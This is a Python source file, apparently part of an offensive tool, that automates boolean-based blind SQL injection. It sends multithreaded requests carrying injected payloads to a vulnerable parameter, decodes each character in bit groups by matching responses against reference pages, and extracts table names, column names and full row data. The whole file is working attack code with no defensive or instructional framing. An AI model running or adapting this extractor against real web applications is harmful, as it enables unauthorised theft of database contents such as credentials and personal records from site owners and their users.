#!/usr/bin/python3

import sys
import concurrent.futures

from colorama import Fore
from urlQuery import sendReq

# Optimised SQL-ANDing extraction method
def prepPayloadLightSpeed(params, vulnPoint, payloads, row, extract, pos, tblName=None, clmName=None):
    if extract == "tbls":
        injPayload = payloads.format(pos=pos, row=row)
    elif extract == "clms":
        injPayload = payloads.format(pos=pos, tblName=tblName, row=row)
    elif extract == "info":
        injPayload = payloads.format(clmName=clmName, pos=pos, tblName=tblName, row=row)
    newParams = params.copy()
    newParams[vulnPoint] = injPayload
    return newParams

def extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract, tblName=None, clmName=None, cookies=None, max_length=100):
    x = ''
    pos = 1

    def getCharacters(payload, t1, t2, t3, t4, t5, t6, t7):
        temp = ''
        newParams = prepPayloadLightSpeed(params, vulnPoint, payload, row, extract, pos, tblName=tblName, clmName=clmName)
        r = sendReq(url, data=newParams, cookies=cookies, allow_redirects=False) if d else sendReq(url, params=newParams, cookies=cookies, allow_redirects=False)
        zV = 2 if payload == payload3 else 3
        if r.text == t1.text:
            temp += bin(1)[2:].zfill(zV)
        elif r.text == t2.text:
            temp += bin(2)[2:].zfill(zV)
        elif r.text == t3.text:
            temp += bin(3)[2:].zfill(zV)
        elif r.text == t4.text:
            temp += bin(4)[2:].zfill(zV)
        elif r.text == t5.text:
            temp += bin(5)[2:].zfill(zV)
        elif r.text == t6.text:
            temp += bin(6)[2:].zfill(zV)
        elif r.text == t7.text:
            temp += bin(7)[2:].zfill(zV)
        else:
            temp += bin(0)[2:].zfill(zV)
        return temp

    with concurrent.futures.ThreadPoolExecutor() as executor:
        while True:
            futures = []
            for payload in [payload1, payload2, payload3]:
                futures.append(executor.submit(getCharacters, payload, t1, t2, t3, t4, t5, t6, t7))
            results = [future.result() for future in futures]
            tBin = ''.join(results)
            if len(tBin) == 0 or '00000000' in tBin:
                break
            if len(x) >= max_length:
                break
            x += chr(int(tBin, 2))
            sys.stdout.write(Fore.GREEN + f"\r[*] Result: {x}" + Fore.RESET)
            pos += 1
    return x

def extractTablesLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, cookies=None):
    row = 0
    tblNames = []
    while True:
        tempTbl = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='tbls', cookies=cookies)
        if tempTbl:
            print ()
            tblNames.append(tempTbl)
            row += 1
        else:
            break
    return tblNames

def extractColumnsLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames, cookies=None):
    if tblNames:
        print (Fore.YELLOW + f"Tables: {tblNames}" + Fore.RESET)
    clmNames = {}
    for tblName in tblNames:
        row = 0
        clmNames[tblName] = []
        while True:
            tempClm = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='clms', tblName=tblName, cookies=cookies)
            if tempClm:
                print ()
                clmNames[tblName].append(tempClm)
                row += 1
            else:
                break
    return clmNames
    
def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames, cookies=None):
    if clmNames:
        print (Fore.YELLOW + f"Columns: {clmNames}" + Fore.RESET)
    info = {}
    for tblName in tblNames:
        row = 0
        info[tblName] = []
        while True:
            tempDict = {}
            for clmName in clmNames[tblName]:
                print ()
                tempInfo = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='info', tblName=tblName, clmName=clmName, cookies=cookies)
                tempDict[clmName] = tempInfo
            if not any(tempDict.values()):
                break
            info[tblName].append(tempDict)
            row += 1
    return info              

def extractLightspeedMain(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tbl=None, clm=None, cookies=None):
    info = {}
    tblNames = [tbl] if tbl is not None else extractTablesLightSpeed(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t1, t2, t3, t4, t5, t6, t7, d, cookies=cookies)
    clmNames = {tbl: clm} if clm is not None else extractColumnsLightSpeed(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t1, t2, t3, t4, t5, t6, t7, d, tblNames, cookies=cookies)
    info.update(extractInfoLightSpeed(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames, cookies=cookies))
    
    if tbl is None and clm is None and info:
        return True, info
    elif tblNames and clmNames and info and any(info.values()):
        return True, info
    else:
        return False, info
